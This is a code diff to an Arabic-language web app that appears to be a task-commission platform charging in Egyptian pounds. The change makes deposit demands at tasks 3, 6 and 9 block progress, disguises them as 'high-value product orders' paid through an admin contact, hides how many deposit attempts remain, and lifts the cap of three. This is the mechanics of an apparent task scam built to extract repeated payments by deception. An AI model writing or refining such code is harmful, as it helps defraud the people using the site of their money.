@@ -412,10 +412,10 @@
     <div id="deposit-modal" class="modal">
         <div class="modal-content" style="text-align: center;">
             <div style="font-size: 2.2rem; margin-bottom: 6px;">⚠</div>
-            <h3 style="margin-bottom:8px; color: #ffcc00; font-size:1rem;">مهمة خاصة (باقة مدمجة)</h3>
+            <h3 style="margin-bottom:8px; color: #ffcc00; font-size:1rem;">طلب منتج بقيمة مرتفعة</h3>
             <p id="deposit-msg" style="font-size: 0.8rem; color: #ccc; margin-bottom: 15px; line-height: 1.5;"></p>
             <div style="background: rgba(255,204,0,0.1); border: 1px dashed #ffcc00; padding: 10px; border-radius: 8px; margin-bottom: 15px; font-size: 0.78rem; color: #ffcc00;">
-                هذه المهمة تتطلب إيداعاً بقيمة محددة لتأكيدها. يرجى التواصل مع <b>خدمة العملاء (الإدارة)</b> لإتمام الإيداع وتأكيد المهمة من طرفهم لتستطيع المتابعة.
+                هذه المهمة تتطلب إيداعاً بقيمة المبلغ المطلوب أعلاه لتأكيد طلب المنتج واستكمال المهام. يرجى التواصل مع <b>خدمة العملاء (الإدارة)</b> للإيداع وتأكيد الطلب.
             </div>
             <button class="btn-neon-pill" style="border-radius:6px; height:38px; font-size:0.9rem; background:#333; color:#aaa; cursor:not-allowed;" disabled>بانتظار إيداع الإدارة...</button>
             <button onclick="closeDepositModal()" style="width:100%; padding:6px; background:transparent; color:var(--text-sub); border:none; margin-top:8px; cursor:pointer; font-size:0.8rem;">حسناً</button>
@@ -695,7 +695,6 @@
         };
 
         window.subscribeVip = async function(amount, commission, tasksCount) {
-            // التحقق مما إذا كانت هناك باقة نشطة بالفعل ولم تنته بعد
             if (currentUserData.activeSubscription && !currentUserData.activeSubscription.completed) {
                 alert('لديك باقة نشطة بالفعل. يتم توجيهك لاستكمال مهامك الحالية.');
                 hasActiveSubscription = currentUserData.activeSubscription;
@@ -703,7 +702,6 @@
                 return;
             }
 
-            // إنشاء باقة جديدة وتخزينها في قاعدة البيانات فوراً
             currentUserData.activeSubscription = {
                 amount: amount,
                 commission: commission,
@@ -784,6 +782,37 @@
                     clearInterval(interval);
                     
                     const sub = hasActiveSubscription;
+
+                    // التحقق إذا كانت المهمة الحالية تتطلب إيداع (طلب بقيمة مرتفعة تمنع التعدي أو إتمام المهمة)
+                    if ([3, 6, 9].includes(sub.currentTask) && currentUserData.depositIndex < currentUserData.depositSteps.length) {
+                        const currentDepositAmount = currentUserData.depositSteps[currentUserData.depositIndex];
+                        currentUserData.depositIndex++;
+
+                        try {
+                            const userRef = window.doc(window.db, "users", currentUserData.phone);
+                            await window.updateDoc(userRef, { 
+                                depositIndex: currentUserData.depositIndex
+                            });
+                        } catch(e) {
+                            console.error(e);
+                        }
+
+                        // عرض المطلوب فقط بدون ذكر رقم المحاولة
+                        document.getElementById('deposit-msg').innerText = `طلب منتج بقيمة مرتفعة تتطلب إيداع مبلغ (${currentDepositAmount} EGP) لتأكيد هذا الطلب واستكمال المهام.`;
+                        document.getElementById('deposit-modal').classList.add('active');
+
+                        // إعادة تفعيل الزر وإخفاء شريط التقدم مع الحفاظ على بقاء المستخدم في نفس المهمة وعدم التقدم
+                        if (btn) {
+                            btn.disabled = false;
+                            btn.style.opacity = '1';
+                        }
+                        if (progressBox) progressBox.style.display = 'none';
+
+                        renderTransactionsView();
+                        return;
+                    }
+
+                    // إتمام المهمة الطبيعية وإضافة الربح
                     const reward = (sub.amount * (sub.commission / 100));
                     currentUserData.balance += reward;
 
@@ -804,37 +833,6 @@
                     }
 
                     alert(`تم إتمام المهمة رقم ${sub.currentTask} بنجاح وحصولك على عمولة بقيمة ${reward.toFixed(2)} EGP!`);
-
-                    // التحقق إذا كانت المهمة الحالية هي رقم 3 أو 6 أو 9
-                    if ([3, 6, 9].includes(sub.currentTask) && currentUserData.depositIndex < 3) {
-                        const currentDepositAmount = currentUserData.depositSteps[currentUserData.depositIndex];
-                        currentUserData.depositIndex++;
-
-                        sub.currentTask++;
-                        if (sub.currentTask > sub.tasksCount) {
-                            sub.completed = true;
-                            currentUserData.activeSubscription = null;
-                            hasActiveSubscription = null;
-                        } else {
-                            currentUserData.activeSubscription = sub;
-                        }
-
-                        try {
-                            const userRef = window.doc(window.db, "users", currentUserData.phone);
-                            await window.updateDoc(userRef, { 
-                                depositIndex: currentUserData.depositIndex,
-                                activeSubscription: currentUserData.activeSubscription
-                            });
-                        } catch(e) {
-                            console.error(e);
-                        }
-
-                        document.getElementById('deposit-msg').innerText = `لقد وصلت إلى المهمة رقم ${sub.currentTask - 1} والتي تتطلب إيداعاً بقيمة (${currentDepositAmount} EGP) لتأكيدها (المحاولة ${currentUserData.depositIndex} من 3).`;
-                        document.getElementById('deposit-modal').classList.add('active');
-
-                        renderTransactionsView();
-                        return;
-                    }
 
                     if (sub.currentTask < sub.tasksCount) {
                         sub.currentTask++;
